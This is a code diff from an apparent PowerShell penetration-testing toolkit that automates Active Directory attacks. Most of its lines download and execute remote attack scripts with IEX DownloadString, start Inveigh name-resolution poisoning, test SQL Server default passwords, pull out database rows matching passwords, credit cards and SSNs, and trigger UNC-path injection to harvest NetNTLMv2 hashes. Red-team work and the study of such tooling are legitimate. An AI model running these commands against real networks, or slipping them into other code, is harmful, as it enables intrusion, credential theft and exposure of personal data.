@@ -125,26 +125,24 @@ function Inveigh {
     {   
         if (isadmin)
         {
-                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}'
-		#Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
-        }
+                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}
+		}
         else 
         {
-               cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}'
-	       #Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
-        }
+               cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}
+	    }
     }
     else
     {
         if (isadmin)
         {
-                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory $currentPath\;}'
-		#Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
+                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory $currentPath\;}
+		
         }
         else 
         {
                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory $currentPath\;}
-	       #Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
+	       
         }
     }
 
@@ -510,30 +508,30 @@ function domainreconmodules
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
             Import-Module .\Microsoft.ActiveDirectory.Management.dll
-	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
+	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
-	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/Pviewdev.ps1')
-	    $Date = (Get-Date).AddYears(-1).ToFileTime()
+	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/Pviewdev.ps1')
+	        $Date = (Get-Date).AddYears(-1).ToFileTime()
             Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
 	        
-	    Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
+	        Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
             Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
 	        
-	    $Computers = Get-DomainComputer -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
+	        $Computers = Get-DomainComputer -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
             $Users = Get-DomainUser -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
 	        
-	    $DomainPolicy = Get-DomainPolicy -Policy Domain
+	        $DomainPolicy = Get-DomainPolicy -Policy Domain
             $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
             $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
 	        
-	    Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
+	        Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        
-	    $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain share files - can take a while? (yes/no)'
+	        $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain share files - can take a while? (yes/no)'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
 	        	Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
-	    }
+	        }
             
             $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
             if ($aclight -eq "yes" -or $aclight -eq "y" -or $aclight -eq "Yes" -or $aclight -eq "Y")
@@ -541,37 +539,14 @@ function domainreconmodules
 	    	    Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
                 invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
 
-	    }
+	        }
             
 	    
             $powersql = Read-Host -Prompt 'Start PowerUpSQL Checks? (yes/no)'
             if ($powersql -eq "yes" -or $powersql -eq "y" -or $powersql -eq "Yes" -or $powersql -eq "Y")
             {
-	    	Write-Host -ForegroundColor Yellow 'Searching for MSSQL Server instances in the domain:'
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowerUpSQL.ps1')
-		Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\MSSQLServers.txt"
-		
-		Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
-		$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
-		$Targets >> "$currentPath\DomainRecon\MSSQLServer_Accessible.txt"
-		$Targets.Instance >> "$currentPath\DomainRecon\MSSQLServer_AccessibleInstances.txt"
-		
-		Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
-		Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\DomainRecon\MSSQLServer_DefaultLogin.txt"
-		
-		Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
-		foreach ($line in $Targets.Instance)
-		{
-			Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\MSSQLServer_Accessible_DumpInformation.txt"
-			Invoke-SQLDumpInfo -Verbose -Instance $line
-			Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\DomainRecon\MSSQLServer_Accessible_Audit_$Targets.Computername.txt"
-			mkdir "$currentPath\DomainRecon\SQLInfoDumps"
-			$Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\MSSQLServer_Accessible_PotentialSensitiveData.txt" 
-		}
-		Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
-		move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
-		# XP_Cmdshell functions follow - maybe.
-	    }
+	    	    powerSQL    
+	        }
 	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
@@ -579,6 +554,71 @@ function domainreconmodules
             invoke-expression 'cmd /c start powershell -Command {.\DomainRecon\ADrecon\recon.ps1}'
 }
 
+
+function powerSQL
+{
+<#
+        .DESCRIPTION
+        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    #Domain Recon / Lateral Movement Phase
+   
+    Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowerUpSQL.ps1')
+    Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"
+    
+    Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
+    $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
+    $Targets >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"
+    $Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"
+    
+    Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
+    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\DomainRecon\SQLServer_DefaultLogin.txt"
+    
+    Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
+    foreach ($line in $Targets.Instance)
+    {
+        Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
+        Invoke-SQLDumpInfo -Verbose -Instance $line $line >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
+        Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_Audit_$Targets.Computername.txt"
+        mkdir "$currentPath\DomainRecon\SQLInfoDumps"
+        $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
+    }
+    Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
+    move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
+    $uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'
+    if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
+    {
+        $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
+        if ($responder -eq "yes" -or $responder -eq "y" -or $responder -eq "Yes" -or $responder -eq "Y")
+        {
+            $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface:'
+        }
+        else
+        {
+            $smbip = Get-currentIP
+            Inveigh
+        }
+	    Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress    
+	}
+    # XP_Cmdshell functions follow - maybe.
+	      
+}
+
+function Get-currentIP
+{
+<#
+        .DESCRIPTION
+        Gets the current active IP-Address configuration.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    #Domain Recon / Lateral Movement Phase
+    $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
+    return $IPaddress
+}
 
 function sharphound
 {
